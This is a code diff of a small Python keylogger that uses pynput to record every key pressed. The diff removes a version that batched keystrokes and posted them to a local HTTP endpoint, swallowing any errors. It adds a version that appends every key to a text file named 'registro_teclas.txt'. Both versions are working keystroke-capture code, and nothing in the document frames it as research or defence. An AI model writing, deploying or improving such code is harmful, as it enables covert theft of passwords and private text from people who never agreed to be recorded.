@@ -1,27 +1,12 @@
 from pynput import keyboard
-import requests
-import threading
-
-keys = []
 
 def on_press(key):
     try:
-        keys.append(key.char)
+        with open("registro_teclas.txt", "a") as archivo:
+            archivo.write(f'{key.char}\n')
     except AttributeError:
-        keys.append(str(key))
+        with open("registro_teclas.txt", "a") as archivo:
+            archivo.write(f'{key}\n')
 
-    if len(keys) >= 10:  # Envía cada 10 teclas
-        send_keys()
-
-def send_keys():
-    global keys
-    data = {"keystrokes": ''.join(keys)}
-    try:
-        requests.post("http://localhost:5000/log", json=data)
-    except:
-        pass
-    keys = []
-
-listener = keyboard.Listener(on_press=on_press)
-listener.start()
-listener.join()
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
